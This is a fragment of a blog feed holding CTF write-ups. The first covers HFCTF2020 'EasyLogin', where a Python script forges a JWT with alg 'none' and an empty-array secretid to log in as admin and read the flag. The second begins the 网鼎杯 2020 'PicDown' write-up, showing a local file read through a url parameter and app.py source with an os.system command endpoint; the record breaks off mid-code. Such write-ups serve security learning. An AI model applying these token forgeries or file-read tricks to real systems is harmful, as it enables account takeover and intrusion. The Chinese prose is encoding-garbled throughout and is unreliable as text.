class="line">|</span><br><span class="line">+- products.js &lt;-- é›†ä¸­å¤„ç†Product</span><br><span class="line">|</span><br><span class="line">+- rest.js &lt;-- æ”¯æŒRESTçš„middleware</span><br><span class="line">|</span><br><span class="line">+- app.js &lt;-- ä½¿ç”¨koaçš„js</span><br><span class="line">|</span><br><span class="line">+- controller.js &lt;-- æ‰«ææ³¨å†ŒController</span><br><span class="line">|</span><br><span class="line">+- static-files.js &lt;-- æ”¯æŒé™æ€æ–‡ä»¶çš„middleware</span><br><span class="line">|</span><br><span class="line">+- templating.js &lt;-- æ”¯æŒNunjucksçš„middleware</span><br><span class="line">|</span><br><span class="line">+- package.json &lt;-- é¡¹ç›®æè¿°æ–‡ä»¶</span><br><span class="line">|</span><br><span class="line">+- views&#x2F; &lt;-- Nunjucksæ¨¡æ¿</span><br><span class="line">|</span><br><span class="line">+- static&#x2F; &lt;-- é™æ€èµ„æºæ–‡ä»¶</span><br><span class="line">|</span><br><span class="line">+- node_modules&#x2F; &lt;-- npmå®‰è£…çš„æ‰€æœ‰ä¾èµ–åŒ…</span><br></pre></td></tr></table></figure><p><em>â€”â€”<a href="https://www.liaoxuefeng.com/wiki/1022910821149312/1105009634703392">å¼€å‘REST API</a></em></p><img src="/images/HFCTF2020-EasyLogin/image-20210818234733270.png" alt="image-20210818234733270" style="zoom:67%;"><p><em>â€”â€”<a href="https://blog.csdn.net/weixin_33894640/article/details/91459845">ä¸€æ­¥ä¸€æ­¥æ•™ä½ å®ŒæˆKoa2æ¥å£å¼€å‘I</a></em></p></blockquote><p>éšç€å·¥ç¨‹çš„å¢åŠ åŠå·¥ç¨‹äººå‘˜çš„å¢å¤šã€éœ€æ±‚çš„å¢å¤šï¼Œæˆ‘ä»¬éœ€è¦åˆç†çš„è§„èŒƒæ¥ä¿è¯ä»£ç çš„ç®¡ç†æ•ˆç‡ä¸èŠ±è´¹ã€‚è¿™äº›ç»“æ„ä¸Šçš„ç»†åŒ–ä¾¿éšä¹‹åŠ æ·±ã€‚</p><blockquote><p>çœ‹ç€æ„Ÿè§‰ååˆ†æ²³é‡Œå•Šâ€¦â€¦è¿™éƒ½æ˜¯ç»éªŒå•Š~</p></blockquote><h5><span id="ç»éªŒ">ç»éªŒ</span></h5><p>æœ‰äº†ä»¥ä¸ŠçŸ¥è¯†ä½œä¸ºé“ºå«ï¼Œå†çœ‹å¼•å…¥çš„ app.js ï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œè¿™ä¼¼ä¹æ˜¯é€šè¿‡apié€šä¿¡çš„â€¦â€¦</p><p>é¡ºç†æˆç« åœ°ï¼Œå¦‚æœæˆ‘ä»¬èƒ½è¯»å–apiçš„é€»è¾‘ï¼Œåº”è¯¥å°±å¯ä»¥æˆåŠŸä¼ªé€ jwtäº†ï¼ </p><blockquote><p>éš¾ç‚¹ä¹Ÿå°±åœ¨äºæ­¤äº†å§â€¦â€¦</p><p>å³ä½¿ç”¨koa-staticæ‰˜ç®¡é™æ€èµ„æºï¼Œæ¥å£ä¹Ÿæœ‰å¯èƒ½è¢«çˆ¬åˆ°å§â€¦â€¦åªæœ‰æ··æ·†æˆ–åŠ å¯†ï¼Ÿ</p><p>ä¸å¤ªæ‡‚æ¬¸â€¦â€¦</p></blockquote><h4><span id="ä¼ªé€ ">ä¼ªé€ </span></h4><p>/controllers/api.jsï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> APIError = <span class="built_in">require</span>(<span class="string">&#x27;../rest&#x27;</span>).APIError;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="string">&#x27;POST /api/register&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">!username || username === <span class="string">&#x27;admin&#x27;</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;register error&#x27;</span>, <span class="string">&#x27;wrong username&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params"><span class="built_in">global</span>.secrets.length &gt; <span class="number">100000</span></span>)</span> &#123;</span><br><span class="line">            <span class="built_in">global</span>.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = <span class="built_in">global</span>.secrets.length;</span><br><span class="line">        <span class="built_in">global</span>.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;POST /api/login&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">!username || !password</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;username or password is necessary&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = <span class="built_in">global</span>.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">status</span>)</span> &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/flag&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">ctx.session.username !== <span class="string">&#x27;admin&#x27;</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;permission error&#x27;</span>, <span class="string">&#x27;permission denied&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.readFileSync(<span class="string">&#x27;/flag&#x27;</span>).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/logout&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = <span class="literal">null</span>;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¦æ±‚ç”¨æˆ·åä¸ºadminï¼Œå¯ä»¥æŸ¥åˆ°flag</p><p>ç™»å½•éªŒè¯ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span>(<span class="params">sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>sidä¸èƒ½ä¸ºnullï¼Œä¸èƒ½ä¸å®šä¹‰ï¼Œä¸”å–å€¼èŒƒå›´è§„å®šåœ¨0åˆ°<code>global.secrets</code>é•¿åº¦èŒƒå›´å†…</p><p><strong>æ³¨æ„ï¼Œæ­¤webåº”ç”¨çš„sidéåŠ å¯†æ‰€ä½¿ç”¨çš„sidï¼Œè¿™é‡Œçš„sidä¼¼ä¹æ˜¯ä¸€ç§æ ‡è¯†â€¦â€¦</strong></p><h5><span id="æ˜“å—æ”»å‡»çš„-jwt-åº“">æ˜“å—æ”»å‡»çš„ JWT åº“</span></h5><p>è¯¦è§ï¼š<a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/#Recommendations-for-Library-Developers">Critical vulnerabilities in JSON Web Token libraries</a></p><blockquote><p>*<em>TL;DR:**If you are using <a href="https://github.com/auth0/node-jsonwebtoken"><strong>node-jsonwebtoken</strong></a>, <a href="https://github.com/jpadilla/pyjwt/">pyjwt</a>, <a href="https://github.com/namshi/jose">namshi/jose</a>, <a href="https://github.com/firebase/php-jwt">php-jwt</a> or <a href="https://github.com/kjur/jsjws">jsjwt</a> with asymmetric keys (RS256, RS384, RS512, ES256, ES384, ES512) please update to the latest version. See<a href="http://jwt.io/">jwt.io</a>for more information on the vulnerable libraries.</em>(Updated 2015-04-20)*</p></blockquote><blockquote><p><strong>Meet the â€œNoneâ€ Algorithm</strong></p><p>The<code>none</code>algorithm is a curious addition to JWT. It is intended to be used for situations where the integrity of the token has already been verified. Interestingly enough, it is one of only two algorithms that are mandatory to implement (the other being<code>HS256</code>).</p><p>Unfortunately, some libraries treated tokens signed with the<code>none</code>algorithm as a valid token with a verified signature. The result? Anyone can create their own â€œsignedâ€ tokens with whatever payload they want, allowing arbitrary account access on some systems.</p><p>Putting together such a token is easy. Modify the above example header to contain<code>&quot;alg&quot;: &quot;none&quot;</code>instead of<code>HS256</code>. Make any desired changes to the payload. Use an empty signature (i.e.<code>signature = &quot;&quot;</code>).</p><p>Most (hopefully all?) implementations now have a basic check to prevent this attack: if a secret key was provided, then token verification will fail for tokens using the<code>none</code>algorithm. This is a good idea, but it doesnâ€™t solve the underlying problem: attackers control the choice of algorithm. Letâ€™s keep digging.</p></blockquote><p>è¿™é‡Œæ˜“å—æ”»å‡»æŒ‡çš„æ˜¯ä¸€äº›éå¯¹ç§°åŠ å¯†ç®—æ³•çš„éªŒè¯ï¼Œâ€¦â€¦å¤§æ¦‚ã€‚</p><p>ç›®å‰ JWT åº”è¯¥æ˜¯æ”¯æŒnoneçš„â€¦â€¦</p><blockquote><p>The <code>none</code> algorithm is a <strong>curious</strong> addition to JWT.</p></blockquote><blockquote><p>Most (hopefully all?) implementations now <strong>have a basic check to prevent this attack</strong></p></blockquote><p>æ‰€ä»¥éœ€è¦æˆ‘ä»¬è‡ªè¡Œè®¾è®¡æ¥é¢„é˜²ç©ºè®¾çš„æ”»å‡»</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span>(<span class="params">sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>è¿™å…¶å®å°±æ˜¯ä¸€ä¸ªéªŒè¯ï¼Œæœ€åçš„æœ€åä¹Ÿå°±æ˜¯ï¼Œ<strong>ç»•è¿‡</strong></p><blockquote><p>è¿™éƒ¨åˆ†è¿˜æ˜¯éšè—èµ·æ¥æ¯”è¾ƒå¥½ï¼Ÿâ€¦â€¦</p></blockquote><h5><span id="ç»•è¿‡ä¸å…¶åŸç†">ç»•è¿‡ä¸å…¶åŸç†</span></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure><p>æœ€åæˆ‘ä»¬å°†åœ¨è¿™é‡Œå¯¹JWTè¿›è¡ŒéªŒè¯ï¼Œè¿™ä¹Ÿå†³å®šäº†æˆ‘ä»¬çš„ç»•è¿‡æ–¹å¼</p><p>registerä¸­ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> secretid = <span class="built_in">global</span>.secrets.length;</span><br><span class="line"><span class="built_in">global</span>.secrets.push(secret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure><p>secret æŒ‰é¡ºåºpushè¿›secretsä¸­ï¼Œ<strong>sid</strong>æ­£æ˜¯ä»ä¸­å–å‡ºsecretå€¼çš„ç´¢å¼•</p><p><strong>å¦‚æœæˆ‘ä»¬ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"></span><br><span class="line">token = <span class="string">&#x27;eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjI5Mjk0NTU1LCJwYXNzd29yZCI6ImhoaCIsInNlY3JldGlkIjowfQ.&#x27;</span></span><br><span class="line"></span><br><span class="line">secret = <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(user)</span><br></pre></td></tr></table></figure><p>è®¤è¯å°†ä¼šæç¤ºï¼š</p><p><img src="/images/HFCTF2020-EasyLogin/image-20210819154725607.png" alt="image-20210819154725607"></p><p>æ­£å¦‚ä¹‹å‰å°è¯•çš„æŠ¥é”™ï¼š</p><p><img src="/images/HFCTF2020-EasyLogin/image-20210819154744913.png" alt="image-20210819154744913"></p><p><strong>å¦‚æœè¿™æ ·</strong>ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"></span><br><span class="line">token = <span class="string">&#x27;eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjI5Mjk0NTU1LCJwYXNzd29yZCI6ImhoaCIsInNlY3JldGlkIjowfQ.&#x27;</span></span><br><span class="line"></span><br><span class="line">secret = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(user)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¼šå¾—åˆ°ï¼š</p><p><img src="/images/HFCTF2020-EasyLogin/image-20210819155157713.png" alt="image-20210819155157713"></p><p><strong>æ­£ç¡®çš„è§£æï¼Œå³ä½¿æŒ‡å®šäº†HS256</strong></p><p><strong>undefined</strong>ï¼Œä¹Ÿå¯ä»¥æˆåŠŸï¼Œè¿™å°±æ˜¯ä¸Šé¢è¿‡æ»¤çš„ <strong>åŸå› </strong></p><p>æˆ‘ä»¬åªè¦æ§åˆ¶sidï¼Œä»secretsæ•°ç»„ä¸­å–å‡ºä¸€ä¸ªä¸å­˜åœ¨çš„å€¼å³å¯ï¼Œä½¿ç”¨<strong>å°æ•°</strong>æˆ–è€…ç»™sidè®¾ç½®æˆä¸€ä¸ª<strong>ç©ºæ•°ç»„</strong>ä¹‹ç±»çš„â€¦â€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token = jwt.encode(&#123;<span class="string">&quot;secretid&quot;</span>: [],</span><br><span class="line">                    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;hhh&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;iat&quot;</span>: <span class="number">1629294555</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                   algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span>).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆtokenç™»å…¥admin</p><img src="/images/HFCTF2020-EasyLogin/image-20210819155836881.png" alt="image-20210819155836881" style="zoom:80%;"><p>è·å– flag~</p><img src="/images/HFCTF2020-EasyLogin/image-20210819160525000.png" alt="image-20210819160525000" style="zoom:80%;"><p>æ²¡æƒ³åˆ°å†™äº†è¿™ä¹ˆå¤šï¼Œæ„Ÿè§‰è¿˜æ˜¯æ¯”è¾ƒåœ†æ»¡çš„â€¦â€¦</p><p>å‚è€ƒæ–‡ç« :<br><a href="https://www.cnblogs.com/cjsblog/p/9277677.html">jwtè¯¦è§£</a></p><p><a href="https://www.cnblogs.com/xuzhengzong/articles/11777850.html">JWT å‰åç«¯åˆ†ç¦»åº”ç”¨ï¼Œjwtçš„tokenæœåŠ¡ç«¯ä¸ä¿å­˜ã€ä»…ä¿å­˜åŠ å¯†çš„secretï¼Œæ‰€æœ‰ç”¨æˆ·éƒ½æ˜¯è¿™ä¸€ä¸ªsecret</a></p><p><a href="https://www.freebuf.com/articles/web/180874.html">æ·±å…¥äº†è§£Json Web Tokenä¹‹æ¦‚å¿µç¯‡</a></p><p><a href="https://www.freebuf.com/articles/web/181261.html">æ·±å…¥äº†è§£Json Web Tokenä¹‹å®æˆ˜ç¯‡ </a></p><p><a href="https://cyberpolygon.com/materials/security-of-json-web-tokens-jwt/">Security of JSON Web Tokens  (JWT) - Cyber Polygon </a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ‘˜è¦&lt;br&gt;jwt ä¼ªé€ ï¼Œä¸€ä¸‹å†™å¥½é•¿â€¦â€¦emï¼Œåœ†æ»¡&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown</title>
    <link href="http://example.com/2021/08/17/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/"/>
    <id>http://example.com/2021/08/17/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/</id>
    <published>2021-08-17T09:40:55.284Z</published>
    <updated>2021-08-23T08:05:36.032Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ‘˜è¦<br>ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown</p><a id="more"></a></blockquote><p>/page ä¸‹æœ‰ä¸€ä¸ªurlå‚æ•°ï¼Œè¾“å…¥ä¸€ä¸ªç™¾åº¦ï¼Œå‘ç°ä¸‹è½½äº†ç½‘é¡µæºç </p><p>è¯•ä¸€ä¸‹æœ¬åœ°èµ„æºï¼Œç»“æœè¿˜çœŸè¯»å‡ºæ¥äº†â€¦â€¦flagä¹Ÿæ˜¯æ ¹ç›®å½•â€¦â€¦çœ‹ä¸€çœ¼wp</p><h4><span id="å½“å‰è¿è¡Œçš„ç¨‹åº">å½“å‰è¿è¡Œçš„ç¨‹åº</span></h4><p><strong>/proc/[pid]/cmdline</strong>ï¼šè¾“å‡ºå½“å‰ç¨‹åºçš„å®Œæ•´å‘½ä»¤è¡Œä¿¡æ¯</p><p>æˆ‘ä»¬å¯ä»¥è¯»å–å½“å‰webç¨‹åºçš„è¿è¡Œï¼š**/proc/self/cmdline**</p><p><code>python app.py</code></p><h4><span id="apppy">app.py</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/page&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/no_one_know_the_manager&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manager</span>():</span></span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span 